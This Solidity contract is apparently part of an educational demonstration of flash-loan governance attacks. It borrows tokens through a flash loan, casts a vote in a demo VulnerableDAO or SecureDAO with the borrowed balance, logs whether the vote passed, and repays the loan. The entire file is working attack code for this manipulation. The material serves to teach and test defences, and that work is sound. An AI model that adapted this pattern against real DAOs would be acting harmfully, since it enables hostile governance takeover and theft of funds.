// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./FlashLoanPool.sol";
import "./VulnerableDAO.sol";
import "./SecureDAO.sol";

/**
 * @title FlashLoanAttacker
 * @notice Educational exploit contract that borrows tokens via flash loan and attempts to vote.
 */
contract FlashLoanAttacker is IFlashLoanReceiver {
    FlashLoanPool public immutable pool;
    address public lastTargetDAO;
    uint256 public lastProposalId;
    bool public attackSucceeded;
    string public attackErrorMessage;

    event AttackAttempted(address targetDAO, uint256 proposalId, bool success, string reason);

    constructor(address poolAddress) {
        pool = FlashLoanPool(poolAddress);
    }

    /**
     * @notice Initiates flash loan attack against specified DAO
     */
    function launchAttack(
        address token,
        uint256 amount,
        address targetDAO,
        uint256 proposalId,
        bool isVulnerable
    ) external {
        lastTargetDAO = targetDAO;
        lastProposalId = proposalId;
        attackSucceeded = false;
        attackErrorMessage = "";

        bytes memory params = abi.encode(targetDAO, proposalId, isVulnerable);
        pool.flashLoan(token, amount, params);
    }

    /**
     * @notice Flash loan callback hook
     */
    function executeOperation(
        address token,
        uint256 amount,
        bytes calldata params
    ) external override returns (bool) {
        require(msg.sender == address(pool), "Attacker: Caller not pool");

        (address targetDAO, uint256 proposalId, bool isVulnerable) = abi.decode(
            params,
            (address, uint256, bool)
        );

        if (isVulnerable) {
            // Attempt attack on VulnerableDAO
            try VulnerableDAO(targetDAO).vote(proposalId, true) {
                attackSucceeded = true;
                emit AttackAttempted(targetDAO, proposalId, true, "Exploit Succeeded: Instant balance accepted!");
            } catch Error(string memory reason) {
                attackSucceeded = false;
                attackErrorMessage = reason;
                emit AttackAttempted(targetDAO, proposalId, false, reason);
            }
        } else {
            // Attempt attack on SecureDAO
            try SecureDAO(targetDAO).vote(proposalId, true) {
                attackSucceeded = true;
                emit AttackAttempted(targetDAO, proposalId, true, "Unexpected: Vote passed");
            } catch Error(string memory reason) {
                attackSucceeded = false;
                attackErrorMessage = reason;
                emit AttackAttempted(targetDAO, proposalId, false, reason);
            }
        }

        // Repay flash loan
        IERC20(token).transfer(address(pool), amount);
        return true;
    }
}
